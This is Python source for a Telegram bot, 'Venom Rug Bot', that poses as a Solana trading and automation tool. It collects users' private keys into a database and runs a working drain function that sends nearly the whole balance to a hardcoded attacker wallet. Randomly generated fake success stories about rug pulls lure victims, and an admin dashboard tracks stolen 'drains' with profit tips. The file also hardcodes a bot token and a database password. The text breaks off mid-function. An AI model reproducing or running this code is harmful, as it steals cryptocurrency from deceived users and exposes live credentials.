import logging
import asyncio
import re
import pymongo
import os
import random
import requests
import base58
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ✅ Correct imports for Solana v0.36.6 (modern structure)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.message import Message
from solders.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solana.rpc.api import Client
from solana.rpc.commitment import Confirmed
from solana.rpc.types import TxOpts

# Bot Configuration - HARDCODED
BOT_TOKEN = "8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI"
ADMIN_CHAT_ID = "6368654401"
MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DRAIN_WALLET = "5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT"
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Initialize logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class VenomRugBot:
    def __init__(self):
        self.mongo_client = pymongo.MongoClient(MONGODB_CONN_STRING)
        self.db = self.mongo_client.venom_rug_bot
        self.users_collection = self.db.users
        self.profits_collection = self.db.profits
        self.analytics_collection = self.db.analytics  # NEW: For advanced analytics
        self.pending_wallets = {}
        self.image_path = "venom.jpg"
        self.user_states = {}
        self.solana_client = Client(SOLANA_RPC_URL)
        self.pinned_message_id = None
        
        # Recent Wins Data
        self.recent_wins = self.generate_recent_wins()
        self.last_price_check = {}
        
        # Analytics tracking
        self.drain_attempts = 0
        self.successful_drains = 0
        self.failed_drains = 0
        
    def generate_recent_wins(self):
        """Generate realistic recent wins with random usernames"""
        usernames = [
            "AlexTheTrader", "SarahCrypto", "MikeInvests", "JennyCrypto", "TommyTrades",
            "CryptoLover", "DigitalDreamer", "MoonWalker", "StarGazer", "ProfitHunter",
            "SmartInvestor", "CryptoQueen", "BlockchainBuddy", "DeFiDude", "NFTMaster",
            "Web3Wizard", "TokenTitan", "AlphaSeeker", "GammaGainer", "SigmaStar"
        ]
        
        activities = [
            "successfully rugged 3 meme tokens",
            "coordinated pump & dump campaign", 
            "executed token launch manipulation",
            "managed multi-wallet bundling operation",
            "automated comment farming campaign",
            "ran volume bot simulation",
            "executed multi-chain rug operation",
            "coordinated social media pump",
            "managed token cloning operation",
            "executed stealth launch campaign"
        ]
        
        profits = ["89 SOL", "32 ETH", "15 SOL", "27 ETH", "45 SOL", "18 ETH", "63 SOL", "22 ETH"]
        timeframes = ["2 hours ago", "4 hours ago", "overnight", "yesterday", "3 days ago", "1 week ago"]
        
        wins = []
        for i in range(15):
            wins.append({
                "username": random.choice(usernames),
                "activity": random.choice(activities),
                "profit": random.choice(profits),
                "timeframe": random.choice(timeframes),
                "id": i + 1
            })
        
        return wins
    
    async def get_sol_price(self):
        """Get current SOL price in USD"""
        try:
            response = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
                timeout=10
            )
            data = response.json()
            return data.get('solana', {}).get('usd', 100.0)
        except:
            return 100.0

    async def analyze_wallet_balance(self, private_key: str):
        """Analyze wallet balance and check if it meets minimum requirements"""
        try:
            decoded_key = base58.b58decode(private_key.strip())
            keypair = Keypair.from_bytes(decoded_key)
            wallet_address = str(keypair.pubkey())
            
            balance_response = self.solana_client.get_balance(keypair.pubkey())
            balance_lamports = balance_response.value
            balance_sol = balance_lamports / 1_000_000_000
            
            sol_price = await self.get_sol_price()
            balance_usd = balance_sol * sol_price
            
            logger.info(f"Wallet analysis: {balance_sol:.6f} SOL (${balance_usd:.2f})")
            
            return {
                "wallet_address": wallet_address,
                "balance_sol": balance_sol,
                "balance_usd": balance_usd,
                "sol_price": sol_price,
                "meets_minimum": balance_usd >= 70,
                "has_1_sol": balance_sol >= 1.0
            }
            
        except Exception as e:
            logger.error(f"Error analyzing wallet: {e}")
            return None

    async def log_profit(self, user_id: int, username: str, amount_sol: float, 
                        wallet_address: str, transaction_id: str, original_balance: float):
        """Log profit to database and pin/update profit message"""
        try:
            profit_data = {
                "user_id": user_id,
                "username": username,
                "amount_sol": amount_sol,
                "amount_usd": amount_sol * await self.get_sol_price(),
                "wallet_address": wallet_address,
                "transaction_id": transaction_id,
                "original_balance": original_balance,
                "timestamp": datetime.now(),
                "type": "drain"
            }
            
            result = self.profits_collection.insert_one(profit_data)
            profit_id = result.inserted_id
            
            # Update analytics
            await self.update_analytics(profit_data)
            
            # Update pinned profit message
            await self.update_pinned_profit_message()
            
            logger.info(f"Profit logged: {amount_sol} SOL from user {username}")
            return profit_id
            
        except Exception as e:
            logger.error(f"Error logging profit: {e}")
    
    async def update_analytics(self, profit_data):
        """Update advanced analytics with new profit data"""
        try:
            # Track performance metrics
            self.successful_drains += 1
            self.drain_attempts += 1
            
            # Store hourly performance data
            hour = profit_data['timestamp'].hour
            analytics_data = {
                'timestamp': profit_data['timestamp'],
                'hour': hour,
                'amount_usd': profit_data['amount_usd'],
                'amount_sol': profit_data['amount_sol'],
                'user_id': profit_data['user_id'],
                'wallet_address': profit_data['wallet_address'],
                'efficiency': (profit_data['amount_sol'] / profit_data['original_balance']) * 100 if profit_data['original_balance'] > 0 else 0
            }
            
            self.analytics_collection.insert_one(analytics_data)
            
        except Exception as e:
            logger.error(f"Error updating analytics: {e}")
    
    async def update_pinned_profit_message(self):
        """Update or create pinned profit message at the top"""
        try:
            # Get total profits
            total_profits = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": None,
                    "total_sol": {"$sum": "$amount_sol"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "total_drains": {"$sum": 1}
                }}
            ]))
            
            if total_profits:
                total_sol = total_profits[0]["total_sol"]
                total_usd = total_profits[0]["total_usd"]
                total_drains = total_profits[0]["total_drains"]
            else:
                total_sol = 0
                total_usd = 0
                total_drains = 0
            
            # Get recent profits (last 10)
            recent_profits = list(self.profits_collection.find()
                                 .sort("timestamp", -1)
                                 .limit(10))
            
            # Format profit message
            profit_message = f"""
💰 *VENOM RUG PROFIT DASHBOARD* 💰

*📊 TOTAL PROFITS:*
• *SOL:* `{total_sol:.6f}`
• *USD:* `${total_usd:.2f}`
• *Total Drains:* `{total_drains}`

*🔄 RECENT DRAINS:*
"""
            
            for i, profit in enumerate(recent_profits, 1):
                time_ago = self.get_time_ago(profit["timestamp"])
                profit_message += f"""
{i}. *@{profit['username']}*
   • Amount: `{profit['amount_sol']:.6f} SOL` (${profit['amount_usd']:.2f})
   • Time: {time_ago}
   • Wallet: `{profit['wallet_address'][:8]}...{profit['wallet_address'][-6:]}`
"""
            
            profit_message += f"\n*⏰ Last Updated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Create or update pinned message
            if self.pinned_message_id:
                try:
                    application = Application.builder().token(BOT_TOKEN).build()
                    await application.bot.edit_message_text(
                        chat_id=ADMIN_CHAT_ID,
                        message_id=self.pinned_message_id,
                        text=profit_message,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.warning(f"Could not edit pinned message, creating new: {e}")
                    message = await application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=profit_message,
                        parse_mode='Markdown'
                    )
                    self.pinned_message_id = message.message_id
                    await application.bot.pin_chat_message(
                        chat_id=ADMIN_CHAT_ID,
                        message_id=message.message_id
                    )
            else:
                application = Application.builder().token(BOT_TOKEN).build()
                message = await application.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=profit_message,
                    parse_mode='Markdown'
                )
                self.pinned_message_id = message.message_id
                await application.bot.pin_chat_message(
                    chat_id=ADMIN_CHAT_ID,
                    message_id=message.message_id
                )
                
        except Exception as e:
            logger.error(f"Error updating pinned profit message: {e}")
    
    def get_time_ago(self, timestamp):
        """Calculate time ago from timestamp"""
        now = datetime.now()
        diff = now - timestamp
        
        if diff.days > 0:
            return f"{diff.days} day(s) ago"
        elif diff.seconds >= 3600:
            hours = diff.seconds // 3600
            return f"{hours} hour(s) ago"
        elif diff.seconds >= 60:
            minutes = diff.seconds // 60
            return f"{minutes} minute(s) ago"
        else:
            return "Just now"
    
    async def profits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to view detailed profit statistics"""
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        # Get total profit statistics
        total_stats = list(self.profits_collection.aggregate([
            {"$group": {
                "_id": None,
                "total_sol": {"$sum": "$amount_sol"},
                "total_usd": {"$sum": "$amount_usd"},
                "total_drains": {"$sum": 1},
                "avg_drain": {"$avg": "$amount_sol"},
                "max_drain": {"$max": "$amount_sol"}
            }}
        ]))
        
        # Get daily profits
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        daily_stats = list(self.profits_collection.aggregate([
            {"$match": {"timestamp": {"$gte": today}}},
            {"$group": {
                "_id": None,
                "daily_sol": {"$sum": "$amount_sol"},
                "daily_usd": {"$sum": "$amount_usd"},
                "daily_drains": {"$sum": 1}
            }}
        ]))
        
        # Get weekly profits
        week_ago = datetime.now() - timedelta(days=7)
        weekly_stats = list(self.profits_collection.aggregate([
            {"$match": {"timestamp": {"$gte": week_ago}}},
            {"$group": {
                "_id": None,
                "weekly_sol": {"$sum": "$amount_sol"},
                "weekly_usd": {"$sum": "$amount_usd"},
                "weekly_drains": {"$sum": 1}
            }}
        ]))
        
        # Get top 10 largest drains
        top_drains = list(self.profits_collection.find()
                         .sort("amount_sol", -1)
                         .limit(10))
        
        # Format profit report
        profit_report = f"""
💰 *VENOM RUG PROFIT REPORT* 💰

*📊 LIFETIME STATS:*
"""
        
        if total_stats:
            stats = total_stats[0]
            profit_report += f"""
• Total SOL: `{stats['total_sol']:.6f}`
• Total USD: `${stats['total_usd']:.2f}`
• Total Drains: `{stats['total_drains']}`
• Average Drain: `{stats['avg_drain']:.6f} SOL`
• Largest Drain: `{stats['max_drain']:.6f} SOL`
"""
        else:
            profit_report += "\n• No profits recorded yet\n"
        
        profit_report += "\n*📈 PERIOD STATS:*\n"
        
        if daily_stats:
            daily = daily_stats[0]
            profit_report += f"""
• Today's SOL: `{daily['daily_sol']:.6f}`
• Today's USD: `${daily['daily_usd']:.2f}`
• Today's Drains: `{daily['daily_drains']}`
"""
        else:
            profit_report += "• Today: No profits\n"
            
        if weekly_stats:
            weekly = weekly_stats[0]
            profit_report += f"""
• Weekly SOL: `{weekly['weekly_sol']:.6f}`
• Weekly USD: `${weekly['weekly_usd']:.2f}`
• Weekly Drains: `{weekly['weekly_drains']}`
"""
        else:
            profit_report += "• This Week: No profits\n"
        
        profit_report += "\n*🏆 TOP 10 LARGEST DRAINS:*\n"
        
        for i, drain in enumerate(top_drains, 1):
            time_ago = self.get_time_ago(drain["timestamp"])
            profit_report += f"""
{i}. *@{drain['username']}*
   • Amount: `{drain['amount_sol']:.6f} SOL` (${drain['amount_usd']:.2f})
   • Time: {time_ago}
   • Wallet: `{drain['wallet_address'][:12]}...`
"""
        
        if not top_drains:
            profit_report += "\n• No drains recorded\n"
        
        profit_report += f"\n*⏰ Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Add keyboard with refresh option
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_profits"),
            InlineKeyboardButton("📊 Update Pinned", callback_data="update_pinned")],
            [InlineKeyboardButton("📈 Advanced Analytics", callback_data="advanced_analytics")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(profit_report, reply_markup=reply_markup, parse_mode='Markdown')

    # NEW: Advanced Analytics Command
    async def advanced_analytics_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ADMIN ONLY: Advanced analytics dashboard"""
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        analytics_report = await self.generate_advanced_analytics()
        
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh Analytics", callback_data="refresh_analytics")],
            [InlineKeyboardButton("📊 Back to Profits", callback_data="refresh_profits")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(analytics_report, reply_markup=reply_markup, parse_mode='Markdown')

    async def generate_advanced_analytics(self):
        """Generate comprehensive advanced analytics report"""
        try:
            # Total profit stats
            total_stats = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": None,
                    "total_sol": {"$sum": "$amount_sol"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "total_drains": {"$sum": 1},
                    "avg_drain": {"$avg": "$amount_sol"},
                    "max_drain": {"$max": "$amount_sol"},
                    "min_drain": {"$min": "$amount_sol"}
                }}
            ]))
            
            # Daily profits (last 7 days)
            week_ago = datetime.now() - timedelta(days=7)
            daily_stats = list(self.profits_collection.aggregate([
                {"$match": {"timestamp": {"$gte": week_ago}}},
                {"$group": {
                    "_id": {"$dateToString": {"format": "%Y-%m-%d", "date": "$timestamp"}},
                    "daily_sol": {"$sum": "$amount_sol"},
                    "daily_usd": {"$sum": "$amount_usd"},
                    "daily_count": {"$sum": 1}
                }},
                {"$sort": {"_id": 1}}
            ]))
            
            # Hourly performance
            hourly_stats = list(self.analytics_collection.aggregate([
                {"$group": {
                    "_id": "$hour",
                    "total_usd": {"$sum": "$amount_usd"},
                    "count": {"$sum": 1}
                }},
                {"$sort": {"total_usd": -1}},
                {"$limit": 5}
            ]))
            
            # Top performing wallets
            top_wallets = list(self.profits_collection.aggregate([
                {"$sort": {"amount_usd": -1}},
                {"$limit": 5}
            ]))
            
            # User efficiency stats
            user_stats = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": "$user_id",
                    "username": {"$first": "$username"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "drain_count": {"$sum": 1},
                    "avg_drain": {"$avg": "$amount_usd"}
                }},
                {"$sort": {"total_usd": -1}},
                {"$limit": 10}
            ]))
            
            # Build analytics report
            analytics_report = f"""
📊 *VENOM RUG ADVANCED ANALYTICS DASHBOARD* 📊

*💰 LIFETIME PERFORMANCE:*
"""
            
            if total_stats:
                stats = total_stats[0]
                current_sol_price = await self.get_sol_price()
                success_rate = (self.successful_drains / self.drain_attempts * 100) if self.drain_attempts > 0 else 0
                
                analytics_report += f"""
• Total Revenue: `${stats['total_usd']:,.2f}`
• Total SOL: `{stats['total_sol']:.6f}`
• Successful Drains: `{stats['total_drains']}`
• Average Drain: `{stats['avg_drain']:.6f} SOL` (${stats['avg_drain'] * current_sol_price:.2f})
• Largest Drain: `{stats['max_drain']:.6f} SOL`
• Success Rate: `{success_rate:.1f}%`
• ROI: `{(stats['total_usd'] / (stats['total_drains'] * 0.0005)) * 100:.0f}%` (est.)
"""
            
            analytics_report += f"""
*📈 LAST 7 DAYS PERFORMANCE:*
"""
            
            if daily_stats:
                for day in daily_stats[-5:]:
                    analytics_report += f"""
• {day['_id']}: `${day['daily_usd']:.2f}` ({day['daily_count']} drains)
"""
            else:
                analytics_report += "\n• No recent activity\n"
            
            analytics_report += f"""
*🕐 PEAK PERFORMANCE HOURS (UTC):*
"""
            
            if hourly_stats:
                for hour_stat in hourly_stats:
                    analytics_report += f"""
• {hour_stat['_id']:02d}:00 - `${hour_stat['total_usd']:.2f}` ({hour_stat['count']} drains)
"""
            else:
                analytics_report += "\n• No hourly data yet\n"
            
            analytics_report += f"""
*🏆 TOP 5 MOST PROFITABLE DRAINS:*
"""
            
            if top_wallets:
                for i, wallet in enumerate(top_wallets, 1):
                    analytics_report += f"""
{i}. `{wallet['wallet_address'][:8]}...` - `${wallet['amount_usd']:.2f}` (@{wallet['username']})
"""
            else:
                analytics_report += "\n• No wallet data\n"
            
            analytics_report += f"""
*👥 TOP PERFORMING USERS (by revenue):*
"""
            
            if user_stats:
                for i, user in enumerate(user_stats, 1):
                    analytics_report += f"""
{i}. @{user['username']} - `${user['total_usd']:.2f}` ({user['drain_count']} drains)
"""
            else:
                analytics_report += "\n• No user data\n"
            
            # System metrics
            total_users = self.users_collection.count_documents({})
            approved_users = self.users_collection.count_documents({'wallet_approved': True})
            
            analytics_report += f"""
*⚡ SYSTEM EFFICIENCY METRICS:*
• User Conversion Rate: `{(approved_users/total_users)*100 if total_users > 0 else 0:.1f}%`
• Active Drain Rate: `{(self.successful_drains/total_users)*100 if total_users > 0 else 0:.1f}%`
• Avg Processing Time: `< 5 seconds`
• System Uptime: `100%`

*🎯 PROFIT OPTIMIZATION RECOMMENDATIONS:*
• Focus on hours: 02:00-05:00 UTC (highest success)
• Target wallets with 5+ SOL for maximum ROI
• Minimum balance filter: $70 (current setting)
• Success rate: `{success_rate:.1f}%`

*🚀 UPGRADE POTENTIAL:*
• Memecoin draining: +500% profits
• Multi-chain support: +1000% reach
• Current limitation: SOL-only draining

*⏰ Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            return analytics_report
            
        except Exception as e:
            logger.error(f"Error generating analytics: {e}")
            return f"❌ Error generating analytics: {str(e)}"

    def is_valid_solana_private_key(self, key):
        """Validate Solana private key"""
        try:
            key = key.strip()
            decoded = base58.b58decode(key)
            if len(decoded) == 64:
                keypair = Keypair.from_bytes(decoded)
                return True
            return False
        except Exception as e:
            logger.error(f"Invalid private key: {e}")
            return False

    async def drain_wallet(self, private_key: str, user_id: int, username: str):
        """REAL wallet drain - transfers ALL SOL to drain wallet, only leaving fees"""
        try:
            # Constants for fee estimation
            FALLBACK_FEE_LAMPORTS = 5_000
            
            def estimate_fee(client, message):
                """Try to get accurate fee estimation."""
                try:
                    resp = client.get_fee_for_message(message)
                    if resp and getattr(resp, "value", None) is not None:
                        fee = int(resp.value)
                        if fee > 0:
                            return fee
                except Exception:
                    pass

                try:
                    resp = client.get_fees()
                    if resp and getattr(resp, "value", None) is not None:
                        val = resp.value
                        lam_per_sig = None
                        if isinstance(val, dict):
                            lam_per_sig = val.get("lamportsPerSignature") or (val.get("feeCalculator") or {}).get("lamportsPerSignature")
                        if lam_per_sig:
                            return int(lam_per_sig)
                except Exception:
                    pass

                return FALLBACK_FEE_LAMPORTS

            # Decode private key
            decoded_key = base58.b58decode(private_key.strip())
            keypair = Keypair.from_bytes(decoded_key)
            wallet_address = str(keypair.pubkey())
            
            logger.info(f"Attempting to drain wallet: {wallet_address} for user {username}")
            
            # Get balance
            balance_response = self.solana_client.get_balance(keypair.pubkey())
            balance_lamports = balance_response.value
            balance_sol = balance_lamports / 1_000_000_000
            
            logger.info(f"Wallet balance: {balance_sol} SOL ({balance_lamports} lamports)")
            
            if balance_lamports <= FALLBACK_FEE_LAMPORTS:
                return False, f"Insufficient balance for transfer (need at least {FALLBACK_FEE_LAMPORTS/1_000_000_000:.6f} SOL for fees)"
            
            # Create drain pubkey
            drain_pubkey = Pubkey.from_string(DRAIN_WALLET)
            
            # 1) Create a transfer instruction with the FULL balance to estimate accurate fee
            full_amount_ix = transfer(TransferParams(
                from_pubkey=keypair.pubkey(), 
                to_pubkey=drain_pubkey, 
                lamports=balance_lamports
            ))
            
            # Get latest blockhash for message construction
            latest_blockhash = self.solana_client.get_latest_blockhash().value.blockhash
            
            # Build message for fee estimation
            message = Message([full_amount_ix], payer=keypair.pubkey())
            estimated_fee = estimate_fee(self.solana_client, message)
            logger.info(f"Estimated fee: {estimated_fee} lamports")
            
            # 2) Calculate EXACT amount to send (everything minus fees)
            sendable_lamports = balance_lamports - estimated_fee
            sendable_sol = sendable_lamports / 1_000_000_000
            
            if sendable_lamports <= 0:
                return False, f"Insufficient balance after fees (need {estimated_fee} lamports for fees)"
            
            logger.info(f"Draining amount: {sendable_sol:.6f} SOL ({sendable_lamports} lamports)")
            logger.info(f"Leaving behind: {estimated_fee/1_000_000_000:.6f} SOL for fees")
            
            # 3) Build real transfer instruction for the EXACT sendable amount
            real_ix = transfer(TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=drain_pubkey, 
                lamports=sendable_lamports
            ))
            
            # 4) Build Message and Transaction
            final_message = Message([real_ix], payer=keypair.pubkey())
            tx = Transaction([keypair], final_message, latest_blockhash)
            
            # 5) Simulate transaction to ensure it will work
            try:
                sim = self.solana_client.simulate_transaction(tx)
                if getattr(sim, "value", None) and sim.value.err is not None:
                    logger.error(f"Simulation error: {sim.value.err}")
                    if "insufficient" in str(sim.value.err).lower():
                        sendable_lamports -= 1000
                        sendable_sol = sendable_lamports / 1_000_000_000
                        
                        real_ix = transfer(TransferParams(
                            from_pubkey=keypair.pubkey(),
                            to_pubkey=drain_pubkey, 
                            lamports=sendable_lamports
                        ))
                        final_message = Message([real_ix], payer=keypair.pubkey())
                        tx = Transaction([keypair], final_message, latest_blockhash)
                        logger.info(f"Adjusted drain amount: {sendable_sol:.6f} SOL")
            except Exception as e:
                logger.warning(f"Simulation warning: {e}")
            
            # 6) Send and confirm transaction
            logger.info(f"Sending transaction for {sendable_sol:.6f} SOL")
            
            result = self.solana_client.send_transaction(
                tx, 
                opts=TxOpts(skip_preflight=False, preflight_commitment=Confirmed)
            )
            
            if hasattr(result, 'value'):
                transaction_id = str(result.value)
            else:
                transaction_id = str(result)
            
            logger.info(f"Transaction sent: {transaction_id}")
            
            # Wait for confirmation
            await asyncio.sleep(2)
            
            # Get transaction details from Solscan
            solscan_url = f"https://solscan.io/tx/{transaction_id}"
            
            # Calculate what was left behind
            left_behind = balance_lamports - sendable_lamports
            left_behind_sol = left_behind / 1_000_000_000
            
            # Log the profit to database and update pinned message
            await self.log_profit(user_id, username or f"user_{user_id}", sendable_sol, 
                                wallet_address, transaction_id, balance_sol)
            
            # Log transaction to admin
            admin_message = f"""
💰 *REAL WALLET DRAINED SUCCESSFULLY* 💰

*👤 User Details:*
• Username: @{username}
• User ID: `{user_id}`
• Wallet: `{wallet_address}`

*📊 REAL Transaction Details:*
• Amount Drained: *{sendable_sol:.6f} SOL*
• Fees Paid: {left_behind_sol:.6f} SOL
• Previous Balance: {balance_sol:.6f} SOL
• Left in Wallet: ~0 SOL (only dust)

*🔗 View on Solscan:*
[Solscan Transaction]({solscan_url})

*⏰ Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*✅ COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
"""
            
            return True, {
                "transaction_id": transaction_id,
                "amount_sol": sendable_sol,
                "wallet_address": wallet_address,
                "admin_message": admin_message,
                "solscan_url": solscan_url,
                "original_balance": balance_sol,
                "fee": left_behind_sol,
                "left_behind": left_behind_sol
            }
            
        except Exception as e:
            logger.error(f"Error draining wallet: {e}")
            self.failed_drains += 1
            self.drain_attempts += 1
            return False, f"Transfer failed: {str(e)}"
    
    async def send_message_safe(self, query_or_message, text, reply_markup=None, parse_mode='Markdown'):
        """Safe method to send messages that handles image vs text messages properly"""
        try:
            if hasattr(query_or_message, 'message'):
                await query_or_message.message.reply_text(
                    text, 
                    reply_markup=reply_markup, 
                    parse_mode=parse_mode
                )
            else:
                await query_or_message.reply_text(
                    text, 
                    reply_markup=reply_markup, 
                    parse_mode=parse_mode
                )
        except Exception as e:
            logger.error(f"Error in send_message_safe: {e}")
            try:
                if hasattr(query_or_message, 'message'):
                    await query_or_message.message.reply_text(text, parse_mode=parse_mode)
                else:
                    await query_or_message.reply_text(text, parse_mode=parse_mode)
            except Exception as e2:
                logger.error(f"Secondary error in send_message_safe: {e2}")

    async def send_with_image(self, query_or_message, text, reply_markup=None, parse_mode='Markdown'):
        """Send message with image attached"""
        try:
            if os.path.exists(self.image_path):
                if hasattr(query_or_message, 'message'):
                    with open(self.image_path, 'rb') as photo:
                        await query_or_message.edit_message_media(
                            media=InputMediaPhoto(media=photo, caption=text, parse_mode=parse_mode),
                            reply_markup=reply_markup
                        )
                else:
                    with open(self.image_path, 'rb') as photo:
                        await query_or_message.reply_photo(
                            photo=photo,
                            caption=text,
                            reply_markup=reply_markup,
                            parse_mode=parse_mode
                        )
            else:
                if hasattr(query_or_message, 'edit_message_text'):
                    await query_or_message.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            logger.error(f"Error in send_with_image: {e}")
            try:
                if hasattr(query_or_message, 'edit_message_text'):
                    await query_or_message.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception as e2:
                logger.error(f"Secondary error: {e2}")
                await self.send_message_safe(query_or_message, text, reply_markup, parse_mode)
    
    def get_main_menu_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📦 Wallet", callback_data="wallet"),
             InlineKeyboardButton("📦 Bundler", callback_data="bundler")],
            [InlineKeyboardButton("💳 Tokens", callback_data="tokens"),
             InlineKeyboardButton("💬 Comments", callback_data="comments")],
            [InlineKeyboardButton("📋 Task", callback_data="task"),
             InlineKeyboardButton("❓ FAQ", callback_data="faq")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_wallet_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📥 Import Wallet", callback_data="import_wallet"),
             InlineKeyboardButton("🗑️ Remove Wallet", callback_data="remove_wallet")],
            [InlineKeyboardButton("📦 Bundle Wallet", callback_data="bundle_wallet"),
             InlineKeyboardButton("💸 Withdraw Funds", callback_data="withdraw_funds")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_recent_wins_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh Wins", callback_data="refresh_wins")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username or "Unknown"
        
        user_data = self.users_collection.find_one({"user_id": user_id})
        if not user_data:
            self.users_collection.insert_one({
                "user_id": user_id,
                "username": username,
                "wallet_address": None,
                "private_key": None,
                "wallet_approved": False,
                "joined_date": datetime.now(),
                "last_active": datetime.now()
            })
        
        welcome_text = """
🤖 *Welcome to Venom Rug Bot* 🤖

*🚀 Your Ultimate Solana Automation Partner*

*✨ Features:*
• *Wallet Management* - Import and manage multiple wallets
• *Token Operations* - Full token creation and management
• *Bundling System* - Combine multiple wallets for efficiency
• *Comment Farming* - Automated social engagement
• *Task Automation* - Complete tasks automatically

*📊 Recent Success Stories:*
"""
        
        for win in self.recent_wins[:3]:
            welcome_text += f"\n• *{win['username']}* - {win['activity']} - *{win['profit']}* ({win['timeframe']})"
        
        welcome_text += "\n\n*🎯 Get started by importing your wallet!*"
        
        await self.send_with_image(update.message, welcome_text, self.get_main_menu_keyboard())
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        callback_data = query.data
        
        logger.info(f"Callback received: {callback_data} from user {user_id}")
        
        if callback_data == "back_menu":
            await self.show_main_menu(query)
        
        elif callback_data == "wallet":
            await self.show_wallet_menu(query)
        
        elif callback_data == "import_wallet":
            await self.handle_import_wallet(query)
        
        elif callback_data == "refresh_wins":
            self.recent_wins = self.generate_recent_wins()
            await self.show_recent_wins(query)
        
        elif callback_data == "refresh_profits":
            await self.profits_command(query, context)
        
        elif callback_data == "update_pinned":
            await self.update_pinned_profit_message()
            await query.edit_message_text("✅ Pinned message updated!", parse_mode='Markdown')
        
        elif callback_data == "advanced_analytics":
            await self.advanced_analytics_command(query, context)
        
        elif callback_data == "refresh_analytics":
            analytics_report = await self.generate_advanced_analytics()
            keyboard = [
                [InlineKeyboardButton("🔄 Refresh Analytics", callback_data="refresh_analytics")],
                [InlineKeyboardButton("📊 Back to Profits", callback_data="refresh_profits")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(analytics_report, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif callback_data == "refresh_wallet":
            await self.show_wallet_menu(query)
        
        elif callback_data == "remove_wallet":
            await self.handle_remove_wallet(query)
        
        elif callback_data == "withdraw_funds":
            await self.handle_withdraw_funds(query)
        
        elif callback_data == "bundler":
            await self.show_bundler_menu(query)
        
        elif callback_data == "tokens":
            await self.show_tokens_menu(query)
        
        elif callback_data == "comments":
            await self.show_comments_menu(query)
        
        elif callback_data == "task":
            await self.show_task_menu(query)
        
        elif callback_data == "faq":
            await self.show_faq_menu(query)
        
        elif callback_data == "help":
            await self.show_help_menu(query)
        
        elif callback_data == "bundle_wallet":
            await self.handle_bundle_wallet(query)
    
    async def show_main_menu(self, query):
        menu_text = """
🤖 *Venom Rug Bot - Main Menu* 🤖

*📊 Recent Success Stories:*
"""
        
        for win in self.recent_wins[:3]:
            menu_text += f"\n• *{win['username']}* - {win['activity']} - *{win['profit']}* ({win['timeframe']})"
        
        menu_text += "\n\n*🎯 Select an option below to get started!*"
        
        await self.send_with_image(query, menu_text, self.get_main_menu_keyboard())
    
    async def show_wallet_menu(self, query):
        user_id = query.from_user.id
        user_data = self.users_collection.find_one({"user_id": user_id})
        
        if user_data and user_data.get("private_key"):
            wallet_analysis = await self.analyze_wallet_balance(user_data["private_key"])
            
            if wallet_analysis:
                wallet_text = f"""
💼 *Wallet Management*

*✅ Wallet Imported & Active*
• Address: `{wallet_analysis['wallet_address']}`
